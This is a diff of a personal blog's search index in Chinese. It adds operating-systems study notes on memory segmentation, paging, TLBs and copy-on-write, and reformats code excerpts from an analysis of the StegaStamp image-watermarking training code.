@@ -1,21 +1,243 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>内存管理</title>
+    <url>/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h2 id="内存使用与分段"><a href="#内存使用与分段" class="headerlink" title="内存使用与分段"></a>内存使用与分段</h2><h3 id="从计算机如何工作开始讲起"><a href="#从计算机如何工作开始讲起" class="headerlink" title="从计算机如何工作开始讲起"></a>从计算机如何工作开始讲起</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/95.png" class="">
+
+<ul>
+<li>内存使用：将程序放入内存中，PC指向开始地址</li>
+</ul>
+<h3 id="首先让程序进入内存"><a href="#首先让程序进入内存" class="headerlink" title="首先让程序进入内存"></a>首先让程序进入内存</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/96.png" class="">
+
+<p>​    用磁盘将对应的机械代码读入内存，call 40时需要在地址总线上发送40，然后main函数的入口就放在40地址处。而物理内存40正好是_entry到_main的偏移地址，所以_entry就在地址0处。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/97.png" class="">
+
+<p>但如果有0地址处被占用了，或多个程序在内存中，就不能都放在0地址处。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/98.png" class="">
+
+<p>但一旦IP修改到一个空闲的地址，那么call 40就不再是_main的地址。</p>
+<h3 id="重定位：修改程序中的地址-相对地址-逻辑地址"><a href="#重定位：修改程序中的地址-相对地址-逻辑地址" class="headerlink" title="重定位：修改程序中的地址(相对地址/逻辑地址)"></a>重定位：修改程序中的地址(相对地址/逻辑地址)</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/99.png" class="">
+
+<p>什么时候完成重定位？</p>
+<ol>
+<li>编译时（编译时不知道执行时哪些地址是空闲的，在实际系统中何难实现。但例如嵌入式系统烧录后不再改变，就可以实现）</li>
+<li>载入时（在载入内存时重定位，执行前分配空闲的地址）</li>
+<li>运行时（支持进程换入和换出）</li>
+</ol>
+<h3 id="程序载入后还需要移动"><a href="#程序载入后还需要移动" class="headerlink" title="程序载入后还需要移动"></a>程序载入后还需要移动</h3><ul>
+<li>一个重要概念：交换（swap）<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/100.png" class=""></li>
+<li>如果一个进程阻塞了，那么需要将睡眠的进程换出，将就绪的进程换入。</li>
+<li>一旦进程在载入后移动，地址就又发生了该百年。</li>
+</ul>
+</li>
+</ul>
+<h3 id="重定位最合适的时机-运行时重定位"><a href="#重定位最合适的时机-运行时重定位" class="headerlink" title="重定位最合适的时机-运行时重定位"></a>重定位最合适的时机-运行时重定位</h3><ul>
+<li>在运行每条指令时才完成重定位<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/101.png" class=""></li>
+<li>base放在哪里？怎么找到？<ul>
+<li>在PCB中，一旦进程执行，执行指令翻译时，就从PCB中找基地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="引入分段：是将整个程序一起载入内存中吗？"><a href="#引入分段：是将整个程序一起载入内存中吗？" class="headerlink" title="引入分段：是将整个程序一起载入内存中吗？"></a>引入分段：是将整个程序一起载入内存中吗？</h3><ul>
+<li>程序员眼中的程序<ul>
+<li>由若干部分（段）组成，每个段有各自的特点、用途：代码段只读，代码段/数据段不会动态增长</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/102.png" class=""></li>
+</ul>
+</li>
+<li>符合用户观点：用户可独立考虑每个分段（分治）</li>
+<li>怎么具体定位具体指令（数据）：&lt;段号，段内偏移&gt;（&lt;cs:ip&gt;）</li>
+</ul>
+<h3 id="不是将整个程序，是将各个段分别放入内存"><a href="#不是将整个程序，是将各个段分别放入内存" class="headerlink" title="不是将整个程序，是将各个段分别放入内存"></a>不是将整个程序，是将各个段分别放入内存</h3><p>由高地址到低地址分别是：</p>
+<ol>
+<li><p><strong>栈</strong>：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。 在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</p>
+</li>
+<li><p><strong>堆</strong>：用来存储程序运行时分配的变量。</p>
+<p>堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free()等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）  堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</p>
+</li>
+<li><p><strong>BSS段</strong>：用来保存全局的和静态的未初始化变量</p>
+</li>
+<li><p><strong>data段</strong>：用来存放保存全局的和静态的已初始化变量</p>
+</li>
+<li><p><strong>text段</strong>：存放着程序的机器码和只读数据，可执行指令就是从这里取得的。</p>
+</li>
+</ol>
+<p>需要一张表，来记录每个段的<strong>基址、长度、读写权限</strong>等，即<strong>进程段表</strong>（LDT）</p>
+<p>而操作系统的那张段表就是（GDT）</p>
+<h3 id="真正的故事：GDT-LDT"><a href="#真正的故事：GDT-LDT" class="headerlink" title="真正的故事：GDT+LDT"></a>真正的故事：GDT+LDT</h3><p>GDT表项：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/103.png" class="">
+
+<p>通过GDT表分开各个进程的基址，通过LDT表来分开进程中各个段的基址</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/104.png" class="">
+
+<h2 id="内存分区与分页"><a href="#内存分区与分页" class="headerlink" title="内存分区与分页"></a>内存分区与分页</h2><p>编译将程序分成多个段以后，需要将内存分成多个区域。将内存分割后，就能将程序的各个段载入到相应的内存分区中。</p>
+<h3 id="固定分区和可变分区"><a href="#固定分区和可变分区" class="headerlink" title="固定分区和可变分区"></a>固定分区和可变分区</h3><ul>
+<li>将内存等分成k个分区<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/105.png" class=""></li>
+<li>但程序有大有小。段也有大有小，需求不一样，这样不太合适</li>
+</ul>
+</li>
+<li>按需要分配内存分区<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/106.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h3 id="可变分区的管理过程-核心数据结构"><a href="#可变分区的管理过程-核心数据结构" class="headerlink" title="可变分区的管理过程-核心数据结构"></a>可变分区的管理过程-核心数据结构</h3><p>当前内存图像：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/107.png" class="">
+
+<p>对应的表：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/108.png" class="">
+
+<ul>
+<li>当段内存请求：reqSize=100K<ul>
+<li>起始地址+100K</li>
+<li>长度-100K</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/109.png" class=""></li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/110.png" class=""></li>
+</ul>
+</li>
+<li>段2不再需要，释放内存<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/111.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h3 id="可变分区的管理-再次申请"><a href="#可变分区的管理-再次申请" class="headerlink" title="可变分区的管理-再次申请"></a>可变分区的管理-再次申请</h3><ul>
+<li>又一个段提出内存申请：reqSize=40K。空闲分区表中有两个分区，选择哪一个需要合适的算法（长度分别为50K和150K）<ul>
+<li>首<strong>先</strong>适配：选表中第一个空闲分区<ul>
+<li>速度最快</li>
+</ul>
+</li>
+<li>最<strong>佳</strong>适配：选择一个分区长度最接近内存申请长度的区域<ul>
+<li>空闲分区会被分割的越来约小</li>
+</ul>
+</li>
+<li>最<strong>差</strong>适配：选择一个分区长度最不接近内存申请长度的区域（最大的区域）<ul>
+<li>空闲分区长度会很均匀</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="引入分页：解决内存分区导致的内存效率问题"><a href="#引入分页：解决内存分区导致的内存效率问题" class="headerlink" title="引入分页：解决内存分区导致的内存效率问题"></a>引入分页：解决内存分区导致的内存效率问题</h3><ul>
+<li>发起请求reqSize=160K怎么办？<ul>
+<li>总空闲空间&gt;160，但没有一个空闲分区&gt;160，怎么办？<ul>
+<li>这就是内存碎片的问题</li>
+<li>将空闲分区合并，则需要移动：<strong>内存紧缩</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>但是内存紧缩会有大量的性能损失</li>
+</ul>
+<h3 id="从连续到离散"><a href="#从连续到离散" class="headerlink" title="从连续到离散"></a>从连续到离散</h3><p>将内存分成页，针对每个段内存请求，系统一页一页的分配给这个段。</p>
+<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/112.png" class=""></li>
+<li>段内存请求来到后，算一下需要几页的内存，然后将内存一页一页地分配给这个段。</li>
+<li>这样一来有页内部碎片，但没有页外部碎片</li>
+</ul>
+<h3 id="页已经载入了内存，那么"><a href="#页已经载入了内存，那么" class="headerlink" title="页已经载入了内存，那么"></a>页已经载入了内存，那么</h3><p>程序调用内存，需要通过偏移地址，找到对应的页号（页框），而页内的地址需要重定位。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/113.png" class="">
+
+<p>每个进程都有自己的页表：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/114.png" class="">
+
+<p>若有一指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [0x2240],	%eax</span><br></pre></td></tr></table></figure>
+
+<p>则需要将0x2240除以4K（假设的页大小），然后得到页号（商）和页内偏移地址（余数）</p>
+<p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
+<p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
+<p>得到物理地址：0x3240</p>
+<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2><h3 id="页表会很大，页表放置就成了问题"><a href="#页表会很大，页表放置就成了问题" class="headerlink" title="页表会很大，页表放置就成了问题"></a>页表会很大，页表放置就成了问题</h3><p>为了提高空间利用率，页的大小就应该小，但页的表项就会多。</p>
+<ul>
+<li>页大小一般是4k，而地址是32位的，所以由2的20次方个页表现</li>
+<li>这么多页表项，需要4M的内存；当系统中并发10个进程，就需要40M内存</li>
+<li>进程越多，存储页表项需要内存越多，这也是一种内存的浪费</li>
+</ul>
+<p>实际上大部分逻辑地址根本不会用到</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/115.png" class="">
+
+<h3 id="第一种尝试，只存放用到的页"><a href="#第一种尝试，只存放用到的页" class="headerlink" title="第一种尝试，只存放用到的页"></a>第一种尝试，只存放用到的页</h3><ul>
+<li>很自然的想法：只有用到的逻辑页才有页表项<ul>
+<li>但页表中的页号不连续，就需要比较、查找 ，浪费时间</li>
+<li>如果页号连续，一次访问就能找到相应的页框号</li>
+</ul>
+</li>
+<li>页号连续，浪费内存。页号不连续，浪费查找时间</li>
+</ul>
+<p>既要连续又要让页表占用内存少，怎么办？</p>
+<h3 id="多级页表，即页目录表-页表"><a href="#多级页表，即页目录表-页表" class="headerlink" title="多级页表，即页目录表 + 页表"></a>多级页表，即页目录表 + 页表</h3><p>​        多个页号放进一个页目录中，这样生成的页表只记录该页目录下的页，就缩小了页表的长度。而这样的一个页表又是连续的，就不需要比较查找。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/116.png" class="">
+
+<p>​        offset指向了一个4k大小的页。而一个页目录下有1024个页。共有1024个页目录。所以一个32位逻辑地址指向了一个4G的空间。</p>
+<h3 id="多级页表提高了空间效率，但在时间？"><a href="#多级页表提高了空间效率，但在时间？" class="headerlink" title="多级页表提高了空间效率，但在时间？"></a>多级页表提高了空间效率，但在时间？</h3><ul>
+<li>多级页表怎加了访问内存的次数<ul>
+<li>每增加一级页表，内存的访问次数就要怎加一次</li>
+<li>访问次数增多，时间效率不高</li>
+</ul>
+</li>
+<li>快表：TLB是一组相联快速存储，是寄存器<ul>
+<li>将最常用的页号存到寄存器中，调用十分迅速</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/117.png" class="">
+<ul>
+<li>如果命中，可以直接硬件上将逻辑地址转换成物理地址</li>
+<li>如果不命中，就去多级页表中查，然后将这次的存储地址放到快表中（空间局部性好的程序往往查找速度越快）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>多级页表保证了减少了页表中的页表项，减少了内存损耗。通过快表保证了多次使用的内存，查找速度很快。这样以来，空间时间上都有较高的效率。</li>
+</ul>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/118.png" class="">
+
+<p>​        通过有效访问时间的计算，可以判断一个快表的好坏（后面会有换入和换出算法来更新快表，这种算法越好，快表命中率越高）。而快表越大，命中率也越高，但TLB也越贵。</p>
+<h2 id="段页结合的实际内存管理"><a href="#段页结合的实际内存管理" class="headerlink" title="段页结合的实际内存管理"></a>段页结合的实际内存管理</h2><h3 id="段、页同时存在：段面向用户-页面向硬件"><a href="#段、页同时存在：段面向用户-页面向硬件" class="headerlink" title="段、页同时存在：段面向用户/页面向硬件"></a>段、页同时存在：段面向用户/页面向硬件</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/119.png" class="">
+
+<p>每个段再分页映射到物理内存。</p>
+<h3 id="段页同时存在时的重定位"><a href="#段页同时存在时的重定位" class="headerlink" title="段页同时存在时的重定位"></a>段页同时存在时的重定位</h3>  <img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/120.png" class="">
+
+<h3 id="一个实际的段页式内存管理"><a href="#一个实际的段页式内存管理" class="headerlink" title="一个实际的段页式内存管理"></a>一个实际的段页式内存管理</h3><h3 id="从程序放入内存开始"><a href="#从程序放入内存开始" class="headerlink" title="从程序放入内存开始"></a>从程序放入内存开始</h3><ol>
+<li>分配段、建段表；分配页、建页表</li>
+<li>进程带动使用内存</li>
+<li>从进程fork中的内存分配开始<ul>
+<li>fork时会新分配段基址，然后复制父进程的页表</li>
+</ul>
+</li>
+<li>读时共享，写时复制<ul>
+<li>比如在父进程内原来有一个全局变量，如果fork之后父子进程都没有去改变这个变量的值，那么内存中全局区这个变量只会存在一份，所谓读时共享；但是如果fork后父进程或者子进程改变了这个变量的值，那么这个变量将会在内存全局区存在两份，父子进程各自拥有各自的副本，这就是写时复制</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+  </entry>
+  <entry>
     <title>StegaStamp代码分析</title>
     <url>/2022/01/17/StegaStamp%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>课题的思路可能还是得从源码入手，我认为当下的思路应该是：复现-&gt;改进-&gt;创新。</p>
 <p>这里分析论文：StegaStamp: Invisible Hyperlinks in Physical Photographs的源码，我也会在分析过程中寻找可以改进的点。</p>
 <h1 id="数据集预处理"><a href="#数据集预处理" class="headerlink" title="数据集预处理"></a>数据集预处理</h1><p>代码使用的是MIRFLICKR数据集（重采样到400x400分辨率），水印信息是一个二进制串。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#TRAIN_PATH是数据集路径，先读取数据集。</span></span><br><span class="line">91files_list = glob.glob(join(TRAIN_PATH, <span class="string">&quot;**/*&quot;</span>))</span><br><span class="line"></span><br><span class="line">161images, secrets = get_img_batch(files_list=files_list,</span><br><span class="line"><span class="number">162</span>                                            secret_size=args.secret_size,</span><br><span class="line"><span class="number">163</span>                                            batch_size=args.batch_size,</span><br><span class="line"><span class="number">164</span>                                            size=(height, width))</span><br><span class="line"><span class="comment">#get_img_batch(...)</span></span><br><span class="line">20<span class="keyword">def</span> get_img_batch(files_list,	<span class="comment">#数据集的图像表</span></span><br><span class="line"><span class="number">21</span>                  secret_size,	<span class="comment">#水印长度</span></span><br><span class="line"><span class="number">22</span>                  batch_size=<span class="number">4</span>,	<span class="comment">#训练数据集可以分为一个或多个Batch，一次batch获取的图像个数</span></span><br><span class="line"><span class="number">23</span>                  size=(<span class="number">400</span>, <span class="number">400</span>)):	<span class="comment">#重采样大小</span></span><br><span class="line"><span class="number">24</span>    batch_cover = []</span><br><span class="line"><span class="number">25</span>    batch_secret = []</span><br><span class="line"><span class="number">26</span></span><br><span class="line"><span class="number">27</span>    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(batch_size):</span><br><span class="line"><span class="number">28</span>        img_cover_path = random.choice(files_list)	<span class="comment">#随机取一个图像</span></span><br><span class="line"><span class="number">29</span>        <span class="keyword">try</span>:</span><br><span class="line"><span class="number">30</span>            img_cover = Image.<span class="built_in">open</span>(img_cover_path).convert(<span class="string">&quot;RGB&quot;</span>)	<span class="comment">#获取RGB的图像矩阵</span></span><br><span class="line"><span class="number">31</span>            img_cover = ImageOps.fit(img_cover, size)	<span class="comment">#ImageOps.fit()方法返回一个指定大小的裁剪过的图像（重采样为400x400）</span></span><br><span class="line"><span class="number">32</span>            img_cover = np.array(img_cover, dtype=np.float32) / <span class="number">255.</span>	<span class="comment">#归一化</span></span><br><span class="line"><span class="number">33</span>        <span class="keyword">except</span>:</span><br><span class="line"><span class="number">34</span>            img_cover = np.zeros((size[<span class="number">0</span>], size[<span class="number">1</span>], <span class="number">3</span>), dtype=np.float32)</span><br><span class="line"><span class="number">35</span>        batch_cover.append(img_cover)	<span class="comment">#将图像矩阵加入到batch_cover[]中</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">37</span>        secret = np.random.binomial(<span class="number">1</span>, <span class="number">.5</span>, secret_size)	<span class="comment">#生成随机的二进制串，01出现概率是1：1</span></span><br><span class="line"><span class="number">38</span>        batch_secret.append(secret)	<span class="comment">#将二进制串加入到batch_secret[]</span></span><br><span class="line"><span class="number">39</span></span><br><span class="line"><span class="number">40</span>    batch_cover, batch_secret = np.array(batch_cover), np.array(batch_secret)</span><br><span class="line"><span class="number">41</span>    <span class="keyword">return</span> batch_cover, batch_secret	<span class="comment">#返回batch_cover[]和batch_secret</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#TRAIN_PATH是数据集路径，先读取数据集。</span></span><br><span class="line">files_list = glob.glob(join(TRAIN_PATH, <span class="string">&quot;**/*&quot;</span>))</span><br><span class="line"></span><br><span class="line">images, secrets = get_img_batch(files_list=files_list,</span><br><span class="line">                                            secret_size=args.secret_size,</span><br><span class="line">                                            batch_size=args.batch_size,</span><br><span class="line">                                            size=(height, width))</span><br><span class="line"><span class="comment">#get_img_batch(...)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_batch</span>(<span class="params">files_list,	<span class="comment">#数据集的图像表</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  secret_size,	<span class="comment">#水印长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  batch_size=<span class="number">4</span>,	<span class="comment">#训练数据集可以分为一个或多个Batch，一次batch获取的图像个数</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  size=(<span class="params"><span class="number">400</span>, <span class="number">400</span></span>)</span>):</span>	<span class="comment">#重采样大小</span></span><br><span class="line">    batch_cover = []</span><br><span class="line">    batch_secret = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(batch_size):</span><br><span class="line">        img_cover_path = random.choice(files_list)	<span class="comment">#随机取一个图像</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            img_cover = Image.<span class="built_in">open</span>(img_cover_path).convert(<span class="string">&quot;RGB&quot;</span>)	<span class="comment">#获取RGB的图像矩阵</span></span><br><span class="line">            img_cover = ImageOps.fit(img_cover, size)	<span class="comment">#ImageOps.fit()方法返回一个指定大小的裁剪过的图像（重采样为400x400）</span></span><br><span class="line">            img_cover = np.array(img_cover, dtype=np.float32) / <span class="number">255.</span>	<span class="comment">#归一化</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            img_cover = np.zeros((size[<span class="number">0</span>], size[<span class="number">1</span>], <span class="number">3</span>), dtype=np.float32)</span><br><span class="line">        batch_cover.append(img_cover)	<span class="comment">#将图像矩阵加入到batch_cover[]中</span></span><br><span class="line"></span><br><span class="line">        secret = np.random.binomial(<span class="number">1</span>, <span class="number">.5</span>, secret_size)	<span class="comment">#生成随机的二进制串，01出现概率是1：1</span></span><br><span class="line">        batch_secret.append(secret)	<span class="comment">#将二进制串加入到batch_secret[]</span></span><br><span class="line"></span><br><span class="line">    batch_cover, batch_secret = np.array(batch_cover), np.array(batch_secret)</span><br><span class="line">    <span class="keyword">return</span> batch_cover, batch_secret	<span class="comment">#返回batch_cover[]和batch_secret</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="占位符的设置"><a href="#占位符的设置" class="headerlink" title="占位符的设置"></a>占位符的设置</h1><p>占位变量是一种TensorFlow用来解决读取大量训练数据问题的机制,它允许你现在不用给它赋值,随着训练的开始,再把训练数据传送给训练网络<em>学习</em>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span>	secret_pl = tf.placeholder(shape=[<span class="literal">None</span>, args.secret_size], dtype=tf.float32, name=<span class="string">&quot;input_prep&quot;</span>)</span><br><span class="line"><span class="comment">#传入的秘密信息（一串随机生成的二进制串）</span></span><br><span class="line"><span class="number">101</span>	image_pl = tf.placeholder(shape=[<span class="literal">None</span>, height, width, <span class="number">3</span>], dtype=tf.float32, name=<span class="string">&quot;input_hide&quot;</span>)</span><br><span class="line"><span class="comment">#载体图片（400*400）</span></span><br><span class="line"><span class="number">102</span>	M_pl = tf.placeholder(shape=[<span class="literal">None</span>, <span class="number">2</span>, <span class="number">8</span>], dtype=tf.float32, name=<span class="string">&quot;input_transform&quot;</span>)</span><br><span class="line"><span class="comment">#用于投影变换的矩阵，投影变换矩阵的生成也是随机的</span></span><br><span class="line"><span class="number">103</span>	global_step_tensor = tf.Variable(<span class="number">0</span>, trainable=<span class="literal">False</span>, name=<span class="string">&#x27;global_step&#x27;</span>)</span><br><span class="line"><span class="comment">#全局步数，初始化为0，记录训练达到第几轮，什么阶段执行什么样的操作</span></span><br><span class="line"><span class="number">104</span>	loss_scales_pl = tf.placeholder(shape=[<span class="number">4</span>], dtype=tf.float32, name=<span class="string">&quot;input_loss_scales&quot;</span>)</span><br><span class="line"><span class="comment">#损失函数权重，见代码:loss_op = loss_scales[0]*image_loss_op + loss_scales[1]*lpips_loss_op + loss_scales[2]*secret</span></span><br><span class="line"><span class="number">105</span>	l2_edge_gain_pl = tf.placeholder(shape=[<span class="number">1</span>], dtype=tf.float32, name=<span class="string">&quot;input_edge_gain&quot;</span>)</span><br><span class="line"><span class="comment">#用于falloff_im *= l2_edge_gain_pl(没看懂)</span></span><br><span class="line"><span class="number">106</span>	yuv_scales_pl = tf.placeholder(shape=[<span class="number">3</span>], dtype=tf.float32, name=<span class="string">&quot;input_yuv_scales&quot;</span>)</span><br><span class="line"><span class="comment">#没懂，image_loss_op = tf.tensordot(yuv_loss_op, yuv_scales, axes=1)</span></span><br><span class="line"><span class="number">107</span> log_decode_mod_pl = tf.placeholder(shape=[], dtype=tf.float32, name=<span class="string">&quot;input_log_decode_mod&quot;</span>)</span><br><span class="line"><span class="comment">#打开之前训练一半的模型(代码没用到这个变量)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">	secret_pl = tf.placeholder(shape=[<span class="literal">None</span>, args.secret_size], dtype=tf.float32, name=<span class="string">&quot;input_prep&quot;</span>)</span><br><span class="line"><span class="comment">#传入的秘密信息（一串随机生成的二进制串）</span></span><br><span class="line">	image_pl = tf.placeholder(shape=[<span class="literal">None</span>, height, width, <span class="number">3</span>], dtype=tf.float32, name=<span class="string">&quot;input_hide&quot;</span>)</span><br><span class="line"><span class="comment">#载体图片（400*400）</span></span><br><span class="line">	M_pl = tf.placeholder(shape=[<span class="literal">None</span>, <span class="number">2</span>, <span class="number">8</span>], dtype=tf.float32, name=<span class="string">&quot;input_transform&quot;</span>)</span><br><span class="line"><span class="comment">#用于投影变换的矩阵，投影变换矩阵的生成也是随机的</span></span><br><span class="line">	global_step_tensor = tf.Variable(<span class="number">0</span>, trainable=<span class="literal">False</span>, name=<span class="string">&#x27;global_step&#x27;</span>)</span><br><span class="line"><span class="comment">#全局步数，初始化为0，记录训练达到第几轮，什么阶段执行什么样的操作</span></span><br><span class="line">	loss_scales_pl = tf.placeholder(shape=[<span class="number">4</span>], dtype=tf.float32, name=<span class="string">&quot;input_loss_scales&quot;</span>)</span><br><span class="line"><span class="comment">#损失函数权重，见代码:loss_op = loss_scales[0]*image_loss_op + loss_scales[1]*lpips_loss_op + loss_scales[2]*secret</span></span><br><span class="line">	l2_edge_gain_pl = tf.placeholder(shape=[<span class="number">1</span>], dtype=tf.float32, name=<span class="string">&quot;input_edge_gain&quot;</span>)</span><br><span class="line"><span class="comment">#用于falloff_im *= l2_edge_gain_pl(没看懂)</span></span><br><span class="line">	yuv_scales_pl = tf.placeholder(shape=[<span class="number">3</span>], dtype=tf.float32, name=<span class="string">&quot;input_yuv_scales&quot;</span>)</span><br><span class="line"><span class="comment">#没懂，image_loss_op = tf.tensordot(yuv_loss_op, yuv_scales, axes=1)</span></span><br><span class="line">	log_decode_mod_pl = tf.placeholder(shape=[], dtype=tf.float32, name=<span class="string">&quot;input_log_decode_mod&quot;</span>)</span><br><span class="line"><span class="comment">#打开之前训练一半的模型(代码没用到这个变量)</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">110</span> encoder = models.StegaStampEncoder(height=height, width=width)</span><br><span class="line"><span class="comment">#编码器模型</span></span><br><span class="line"><span class="number">111</span> decoder = models.StegaStampDecoder(secret_size=args.secret_size, height=height, width=width)</span><br><span class="line"><span class="comment">#解码器模型</span></span><br><span class="line"><span class="number">112</span> discriminator = models.Discriminator()</span><br><span class="line"><span class="comment">#一个评论网络，可以预测信息是否被编码到图像中，并作为编解码器模型的感知损失，是全部损失函数的一部分</span></span><br></pre></td></tr></table></figure>
+<h1 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> encoder = models.StegaStampEncoder(height=height, width=width)</span><br><span class="line"><span class="comment">#编码器模型</span></span><br><span class="line"> decoder = models.StegaStampDecoder(secret_size=args.secret_size, height=height, width=width)</span><br><span class="line"><span class="comment">#解码器模型</span></span><br><span class="line"> discriminator = models.Discriminator()</span><br><span class="line"><span class="comment">#一个评论网络，可以预测信息是否被编码到图像中，并作为编解码器模型的感知损失，是全部损失函数的一部分</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">114</span> loss_op, secret_loss_op, D_loss_op, summary_op, image_summary_op, _ = models.build_model(</span><br><span class="line"><span class="number">115</span>     encoder=encoder,</span><br><span class="line"><span class="number">116</span>     decoder=decoder,</span><br><span class="line"><span class="number">117</span>	    discriminator=discriminator,</span><br><span class="line"><span class="number">118</span>	  	secret_input=secret_pl,</span><br><span class="line"><span class="number">119</span>     image_input=image_pl,</span><br><span class="line"><span class="number">120</span>     l2_edge_gain=l2_edge_gain_pl,</span><br><span class="line"><span class="number">121</span>     borders=args.borders,</span><br><span class="line"><span class="number">122</span>     secret_size=args.secret_size,</span><br><span class="line"><span class="number">123</span>     M=M_pl,</span><br><span class="line"><span class="number">124</span>	   	loss_scales=loss_scales_pl,</span><br><span class="line"><span class="number">125</span>     yuv_scales=yuv_scales_pl,</span><br><span class="line"><span class="number">126</span>     args=args,</span><br><span class="line"><span class="number">127</span>	  	global_step=global_step_tensor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立模型在models.py中从184行开始</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_model</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    	...</span></span></span><br><span class="line"><span class="params"><span class="function">               </span>):</span></span><br><span class="line">    input_warped = tf.contrib.image.transform(image_input, M[:,<span class="number">1</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    <span class="comment">#根据M[:,1,:]矩阵进行投影变形</span></span><br><span class="line">    <span class="comment">#train.py:178	M = utils.get_rand_transform_matrix(width, np.floor(width * rnd_tran), args.batch_size)</span></span><br><span class="line">    <span class="comment">#获取一个随机的形变矩阵（具体算法可以看utils.py）</span></span><br><span class="line">    mask_warped = tf.contrib.image.transform(tf.ones_like(input_warped), M[:,<span class="number">1</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    input_warped += (<span class="number">1</span>-mask_warped) * image_input</span><br><span class="line">    <span 